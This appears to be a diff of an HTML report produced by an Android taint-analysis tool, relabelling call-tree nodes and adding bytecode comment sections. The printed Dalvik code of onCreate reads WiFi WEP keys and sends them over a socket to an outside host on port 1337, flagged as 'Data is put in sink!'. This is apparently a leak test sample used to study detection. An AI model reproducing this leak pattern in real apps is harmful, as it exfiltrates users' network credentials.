+</pre><pre>invoke-virtual['v1', 'Landroid/support/v4/content/CursorLoader;', 'loadInBackground()Landroid/database/Cursor;']
+move-result-object['v0']
+return-object['v0']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">loadInBackground()Landroid/database/Cursor;<br>0 11 v6</a>
+<a href="#">loadInBackground()Landroid/database/Cursor;<br>blockIdx: 0, instructionIdx: 11, register: v6</a>
 <ul>
 <li>
-  <a href="#">registerContentObserver(Landroid/database/Cursor; Landroid/database/ContentObserver;)V<br>0 0 v2</a>
+  <a href="#">registerContentObserver(Landroid/database/Cursor; Landroid/database/ContentObserver;)V<br>blockIdx: 0, instructionIdx: 0, register: v2</a>
 </li>
 <li>
-  <a href="#">loadInBackground()Ljava/lang/Object;<br>0 2 v0</a>
+  <a href="#">loadInBackground()Ljava/lang/Object;<br>blockIdx: 0, instructionIdx: 2, register: v0</a>
 </li>
 <li>
-  <a href="#">loadInBackground()Ljava/lang/Object;<br>0 2 v0</a>
+  <a href="#">loadInBackground()Ljava/lang/Object;<br>blockIdx: 0, instructionIdx: 2, register: v0</a>
 </li>
 </ul>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
+					  
 
-		        <div class="tab-pane" id="104543656">
+		        <div class="tab-pane" id="4321840592">
 							<h2>onCreate(Landroid/os/Bundle;)V</h2>
-							<h3><div class="tree">
+              <h3>Comments:</h3>
+              <pre>new-instance['v4', 'Landroid/net/wifi/WifiConfiguration;']
+invoke-direct['v4', 'Landroid/net/wifi/WifiConfiguration;', '<init>()V']
+iget-object['v0', 'v4', 'Landroid/net/wifi/WifiConfiguration;', 'wepKeys', '[Ljava/lang/String;']
+new-instance['v3', 'Ljava/net/Socket;']
+const-string['v5', "'www.google.com'"]
+const/16['v6', '1337']
+invoke-direct['v3', 'v5', 'v6', 'Ljava/net/Socket;', '<init>(Ljava/lang/String; I)V']
+new-instance['v2', 'Ljava/io/ObjectOutputStream;']
+invoke-virtual['v3', 'Ljava/net/Socket;', 'getOutputStream()Ljava/io/OutputStream;']
+move-result-object['v5']
+invoke-direct['v2', 'v5', 'Ljava/io/ObjectOutputStream;', '<init>(Ljava/io/OutputStream;)V']
+invoke-virtual['v2', 'v0', 'Ljava/io/ObjectOutputStream;', 'writeObject(Ljava/lang/Object;)V']
+		Data is put in sink!
+return-void['']
+move-exception['v1']
+sget-object['v5', 'Ljava/lang/System;', 'err', 'Ljava/io/PrintStream;']
+invoke-virtual['v5', 'v0', 'Ljava/io/PrintStream;', 'println(Ljava/lang/Object;)V']
+invoke-virtual['v1', 'Ljava/io/IOException;', 'printStackTrace()V']
+goto['-a']
+</pre><pre>new-instance['v4', 'Landroid/net/wifi/WifiConfiguration;']
+invoke-direct['v4', 'Landroid/net/wifi/WifiConfiguration;', '<init>()V']
+iget-object['v0', 'v4', 'Landroid/net/wifi/WifiConfiguration;', 'wepKeys', '[Ljava/lang/String;']
+new-instance['v3', 'Ljava/net/Socket;']
+const-string['v5', "'www.google.com'"]
+const/16['v6', '1337']
+invoke-direct['v3', 'v5', 'v6', 'Ljava/net/Socket;', '<init>(Ljava/lang/String; I)V']
+new-instance['v2', 'Ljava/io/ObjectOutputStream;']
+invoke-virtual['v3', 'Ljava/net/Socket;', 'getOutputStream()Ljava/io/OutputStream;']
+move-result-object['v5']
+invoke-direct['v2', 'v5', 'Ljava/io/ObjectOutputStream;', '<init>(Ljava/io/OutputStream;)V']
+invoke-virtual['v2', 'v0', 'Ljava/io/ObjectOutputStream;', 'writeObject(Ljava/lang/Object;)V']
+return-void['']
+move-exception['v1']
+sget-object['v5', 'Ljava/lang/System;', 'err', 'Ljava/io/PrintStream;']
+invoke-virtual['v5', 'v0', 'Ljava/io/PrintStream;', 'println(Ljava/lang/Object;)V']
+invoke-virtual['v1', 'Ljava/io/IOException;', 'printStackTrace()V']
+goto['-a']
+</pre>
+							<h3>Tree:</h3>
+							<div class="tree">
 <ul><li>
-<a href="#">onCreate(Landroid/os/Bundle;)V<br>1 0 v0</a>
+<a href="#">onCreate(Landroid/os/Bundle;)V<br>blockIdx: 1, instructionIdx: 0, register: v0</a>
 <ul>
 <li>
-  <a href="#">onCreate(Landroid/os/Bundle;)V<br>3 2 v5</a>
+  <a href="#">onCreate(Landroid/os/Bundle;)V<br>blockIdx: 3, instructionIdx: 2, register: v5</a>
 </li>
 </ul>
 </li></ul>
 </div>
-</h3>
+
 						</div>
 		        
 		      
